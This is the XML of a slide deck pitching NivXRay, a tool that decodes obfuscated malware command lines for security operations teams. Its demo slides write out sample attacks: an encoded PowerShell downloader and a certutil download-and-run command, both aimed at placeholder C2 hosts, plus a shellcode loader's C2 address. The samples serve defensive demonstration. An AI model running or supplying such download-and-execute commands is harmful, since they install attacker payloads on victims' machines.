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1155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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>NivXRay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6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Malware Command Intelligence Platform (MCIP)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976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8B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Deterministic malware command-line decoder &amp; threat intelligence — 30-min analyst work in 30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A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Enterprise Demo ·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EE3C9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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Modern malware buries its true intent under 5–8 layers of obfuscation.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800">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• EDR alert fires with a raw, obfuscated commandline (base64 + UTF-16LE + PowerShell + IEX + ...)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• Analyst opens CyberChef, guesses at decoder chain, manually peels layer by layer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 20–40 minutes per commandline · error-prone · unauditable · doesn't scale</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• During incident storms, analysts skip the decode → miss IOCs → delay containment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• SIEM correlation rules were built on decoded IOCs — but the IOCs never made it out of the obfuscation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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Talking point: “Show of hands — who's spent 30 minutes staring at a base64 blob at 2 AM?”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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Cost of Doing Nothing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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>What the manual-decode bottleneck costs a mid-sized SOC.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387" y="2651760"/>
            <a:ext cx="2743200" cy="18288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7E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387" y="278892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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>30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387" y="3703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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>avg time to decode ONE obfuscated commandline manually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92627" y="2651760"/>
            <a:ext cx="2743200" cy="18288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7E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92627" y="278892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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>100+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2627" y="3703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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>obfuscated EDR alerts per day in a mid-sized SOC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2651760"/>
            <a:ext cx="2743200" cy="18288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7E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5867" y="278892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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>50 hrs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5867" y="3703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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>analyst-hours per week lost to CyberChef grunt-work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19107" y="2651760"/>
            <a:ext cx="2743200" cy="18288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7E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19107" y="278892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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a: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19107" y="3703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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>IOCs missed when analysts skip decoding to save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Every missed IOC = a C2 that stayed active for another hour, another day.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Analyst burnout &amp; turnover cost is real — SOC attrition rates hit 25%+ in 2025.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SIEM investment ROI is capped by whatever percentage of IOCs actually reach the correlation layer.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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>What is NivXRay?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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The deterministic decoder layer between EDR alert and SOC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i="1">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>"NivXRay is a Malware Command Intelligence Platform (MCIP) — a deterministic decoder that turns 30-minute manual CyberChef sessions into 30-second automated triage, plugged directly into your EDR, SIEM, ITSM, and SOAR stack."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E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• Deterministic-first — every decode is reproducible, auditable, court-admissible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• AI as fallback — optional LLM layer for the last 5-8% of exotic edge cases.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• Offline-capable — works in airgapped / classified environments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• Category-defining — you own the MCIP acronym.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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Everything a SOC analyst needs from one paste of an alert.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Recursive multi-layer decoder — 34+ plugins covering all major encodings &amp; languages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    ▸ Base64/32/58/91/Ascii85 · UTF-16LE/BE · gzip/brotli/lzma/zstd · XOR (1-8 byte keys)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    ▸ PowerShell/CMD/JS/VBS full string reconstruction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    ▸ ROT13/47 · Caesar · URL/hex encoding · shellcode detection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IOC extraction — URLs, IPs, domains, hashes, User-Agents, mutexes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MITRE ATT&amp;CK auto-mapping — every technique with evidence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LOLBAS attribution — 200+ living-off-the-land binaries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Malware family classification — Cobalt Strike, Meterpreter, Emotet, XWorm...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OSINT enrichment — VirusTotal · AbuseIPDB · Shodan · URLScan · OTX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SOC verdict card — copy-paste-ready ticket summary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STIX 2.1 / JSON / CSV export for TIP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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Architecture (HLD)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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>How NivXRay slots into the enterprise SOC stack.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972800" cy="4114800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050A14"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="7E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74519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EE3C9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7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>┌──────────┐    ┌─────────────────────┐    ┌──────────────┐    ┌────────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>│   EDR    │───▶│      NivXRay        │───▶│   SIEM /     │───▶│    SOAR /      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>│  Alert   │    │      MCIP           │    │  ServiceNow  │    │   Playbook     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>└──────────┘    │                     │    └──────────────┘    └────────────────┘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>CrowdStrike     │ Orchestrator        │    Splunk · Sentinel   XSOAR · Phantom</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>SentinelOne     │ 34+ Decoder plugins │    Chronicle · QRadar  Tines · Torq</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Defender        │ IOC / MITRE / LOLBAS│    Elastic · Exabeam   Swimlane</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Carbon Black    │ Verdict Engine      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Elastic Defend  │ OSINT enrichment    │    ┌──────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>                │ STIX 2.1 export     │───▶│  ITSM        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>                └─────────────────────┘    │  ServiceNow  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>                                            │  Jira SM     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>                                            │  PagerDuty   │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>                                            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Stateless FastAPI backend · Horizontally scalable · MongoDB + Redis persistence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Zero AI dependency in the deterministic path · Optional LLM fallback for exotics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Deployment: SaaS · Self-hosted K8s · Airgap · Hybrid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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Decoder Plugin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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Every decoder is deterministic, isolated, and audit-safe.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ENCODINGS  ○ Base64 · Base32 · Base58 · Base91 · Ascii85 · UTF-16LE/BE · URL · Hex</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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COMPRESSION  ○ Gzip · Zlib · Brotli · LZMA · Zstd · Snappy · Bzip2 · LZ4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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CIPHERS  ○ ROT13 · ROT47 · Caesar · XOR (1-8 byte, brute + LOLBAS-guided)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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PS RECONSTRUCT  ○ -EncodedCommand · [char] · [ScriptBlock]::Create</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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                ○ -join · -f format · .Replace() · $var expansion · IEX-of-var reveal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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CMD RECONSTRUCT  ○ %VAR% · !DELAYED! · Caret escape · CALL FOO reveal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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JS RECONSTRUCT  ○ String.fromCharCode · atob · unescape · eval unwrap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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VBS RECONSTRUCT  ○ Chr()/ChrW() chain · CreateObject ProgID reveal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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EXTRACTION  ○ IOC extractor · MITRE mapper · LOLBAS classifier · Family attribution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120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OSINT  ○ VirusTotal · AbuseIPDB · Shodan · URLScan · OTX · Hybrid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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Integration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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>One tool, four sides of your SOC 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EDR (Ingest)  →  CrowdStrike Falcon · SentinelOne · Defender for Endpoint</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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              →  Carbon Black Cloud · Elastic Defend · Trend Vision One · Cybereason</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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SIEM (Emit)   →  Splunk HEC · Microsoft Sentinel DCR · Chronicle UDM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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              →  IBM QRadar (LEEF) · Elastic SIEM · Exabeam · Sumo Logic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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ITSM (Ticket) →  ServiceNow SIR · ServiceNow ITSM · Jira Service Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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              →  PagerDuty · Opsgenie · Zendesk · Freshservice</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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SOAR (Auto)   →  Splunk SOAR (Phantom) · Palo Alto Cortex XSOAR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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              →  Tines · Torq · Swimlane</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="12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TIP (Share)   →  STIX 2.1 bundle export (MISP / OpenCTI / ThreatConnect)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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Every integration follows a standard playbook — most take 1-3 days to wire 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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Efficiency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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Deterministic-first performance on our RC2.8 benchmark.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387" y="2468880"/>
            <a:ext cx="2743200" cy="18288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7E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387" y="260604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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>96.8%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387" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>deterministic chain-completeness on RC2.8 benchmark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92627" y="2468880"/>
            <a:ext cx="2743200" cy="18288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7E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92627" y="260604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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>&lt;30s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2627" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>average time-to-decode per commandline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2468880"/>
            <a:ext cx="2743200" cy="18288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7E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5867" y="260604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7EE3C9"/>
                </a:solidFill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5867" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>false-positive IOCs in production benchmark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19107" y="2468880"/>
            <a:ext cx="2743200" cy="18288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7E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19107" y="260604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7EE3C9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>100+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19107" y="3520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E6EDF3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>unit tests locking regression prevention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Combined with AI fallback: ~99% total coverage in typical enterprise SOC use.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Per-family: PowerShell 100% · CMD 100% · JavaScript 100% · VBScript 100% · Base64 chains 99%.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Every new customer-reported edge case gets a new plugin — deterministic floor keeps rising.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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Live Demo Battery — 15 Payloads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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Modeled on real APT / commodity malware. Fake C2 domains for safety.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01  Cobalt Strike -EncodedCommand IEX downloader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02  CMD caret escape + PowerShell UTF-16LE + IEX (Emotet-style)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03  CMD !DELAYED! certutil BITS dropper (LOLBAS)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04  VBScript CreateObject + Chr() chain (macro dropper)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05  JavaScript eval(atob(...)) with nested fetch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06  PowerShell [char] + IEX-of-var (Empire / Sliver)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07  PowerShell -f format + -join (Cobalt variant)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08  Gzip + Base64 + PowerShell (Meterpreter migrate)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09  ROT13 wrapper + Base64 + PowerShell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10  Nested Base64 (3-deep) + URL encoding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11  MSFvenom-style shellcode loader with VirtualAlloc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12  WMI CommandLineEventConsumer persistence (APT29-style)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13  MSHTA + JScript + Base64 array (MuddyWater)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14  Encoded PowerShell with sandbox-evasion sleep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15  Multi-family nightmare (CMD → PS → JS → VBS chain)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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Full corpus available in /app/memory/DEMO_PAYLOAD_BATTERY.md · Batch Analyst runs all 15 in one shot.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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Live Demo · Payload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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Cobalt Strike -EncodedCommand IEX downloader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972800" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050A14"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="7E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74519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7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>HQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQB</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>uAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBvAGIAYQBsAHQALQBjADIALmV4YW1wbGUuLi4nACkAKQA=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Expected chain: extract-payload → base64-decode → utf16le-decode → ps-reconstruct → ioc-extract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Expected IOCs: http://cobalt-c2.example.local/beacon.ps1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Expected MITRE: T1059.001 · T1027 · T1105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Expected verdict: MALICIOUS · 90+/100 · Cobalt Strike stager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Elapsed time in NivXRay: &lt;1 second · Manual CyberChef equivalent: 15–20 minutes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394960" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A223A"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="8B94A3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5394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8B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[ INSERT NivXRay result screenshot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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Live Demo · Payload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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>CMD !DELAYED! certutil BITS dropper — LOLBAS abuse.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972800" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="050A14"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="7E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74519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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>cmd.exe /V:ON /c "set A=cert&amp;&amp; set B=util&amp;&amp; !A!!B!.exe -urlcache -split</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>   -f http://drop-c2.example.local/payload.exe %TEMP%\svchost_new.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>   &amp;&amp; start /b %TEMP%\svchost_new.exe"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Expected chain: cmd-reconstruct → ioc-extract → lolbas-family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Reveals: certutil.exe binary + URL + %TEMP% dropper filename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MITRE: T1105 · T1140 · T1218.007 (certutil LOLBAS) · T1027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Verdict: MALICIOUS · 95+/100 · LOLBAS certutil-download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Show buyer: notice the auto-attribution of certutil as LOLBAS T1218.007.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394960" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A223A"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="8B94A3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240280"/>
            <a:ext cx="5394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8B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[ INSERT LOLBAS panel screenshot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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Live Demo · Payload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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>MSFvenom-style shellcode loader — auto-detects shellcode + C2.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PowerShell wrapper allocates memory via VirtualAlloc, copies base64-decoded shellcode, spawns thread.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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NivXRay auto-detects the SHELLCODE stage — no scary binary garbage in the output.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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SOC Verdict banner shows:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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   ○ ARCH: x86</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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   ○ FAMILY: MSFvenom / Meterpreter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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   ○ C2 IP: 149.28.81.19</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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   ○ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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MITRE: T1055 · T1027 · T1140 · T1106 · T1071.001</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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Verdict: MALICIOUS · 95+/100 · Meterpreter x86 stager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37360"/>
            <a:ext cx="5394960" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A223A"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="8B94A3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3566159"/>
            <a:ext cx="5394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8B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[ INSERT Shellcode banner + disassembly screenshot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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Why Deterministic-First?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B94A3"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The differentiator vs LLM-based decoders.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AUDITABLE  →  Every decode step is reproducible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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            Court-admissible in forensic timelines &amp; SOC 2 evidence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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OFFLINE    →  Full engine runs airgapped.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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            Compliant with CJIS · HIPAA · ITAR · classified networks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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FAST       →  Deterministic regex is 1000x faster than an LLM call.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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            &lt;30s at p95, &lt;500ms at p50 — no cloud round-trip.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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CHEAP      →  Zero LLM cost for 92-95% of alerts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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            One-time software cost vs recurring token spend.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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SAFE       →  No hallucinated IOCs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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            LLMs invent URLs that don't exist. Regex only reports what's there.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="11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PRIVATE    →  No commandline data leaves the tenant.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115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            LLM-based tools ship your alert payloads to OpenAI/Anthropic.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EE3C9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
